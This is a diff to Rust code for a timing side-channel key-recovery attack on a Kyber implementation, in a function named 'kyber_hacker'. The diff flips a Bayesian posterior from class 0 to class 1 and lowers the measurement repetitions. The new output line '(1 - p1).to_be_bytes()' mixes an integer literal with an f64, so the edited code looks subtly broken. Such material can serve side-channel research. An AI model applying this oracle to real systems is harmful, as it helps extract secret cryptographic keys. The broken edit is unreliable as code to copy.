@@ -76,8 +76,8 @@ fn log_sum_exp(a: f64, b: f64) -> f64 {
     }
 }
 
-/// posterior P(class = 0 | measurements) with uniform prior
-fn posterior_p0(times: &[u64]) -> (f64, usize) {
+/// posterior P(class = 1 | measurements) with uniform prior
+fn posterior_p1(times: &[u64]) -> (f64, usize) {
     let mut log_lik_0 = 0.0;
     let mut log_lik_1 = 0.0;
     let mut skipped = 0usize;
@@ -511,7 +511,7 @@ fn kyber_hacker(
 
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-    let oracle_repetitions: usize = 10;
+    let oracle_repetitions: usize = 3;
     let mut ct_idx: usize = 0;
     let mut total_calls: usize = 0;
     let mut total_skipped_calls: usize = 0;
@@ -591,9 +591,9 @@ fn kyber_hacker(
         }
         total_calls += oracle_repetitions;
 
-        let (p0, skipped) = posterior_p0(&times_to_load_test_ptr_atk);
+        let (p1, skipped) = posterior_p1(&times_to_load_test_ptr_atk);
         total_skipped_calls += skipped;
-        oracle_stream.write_all(&p0.to_be_bytes()).unwrap();
+        oracle_stream.write_all(&(1 - p1).to_be_bytes()).unwrap();
     }
     println!("Key recovery took {} measurements, filtered out {} of them; total used = {}", total_calls, total_skipped_calls, total_calls - total_skipped_calls);
     threshold_v.clear();
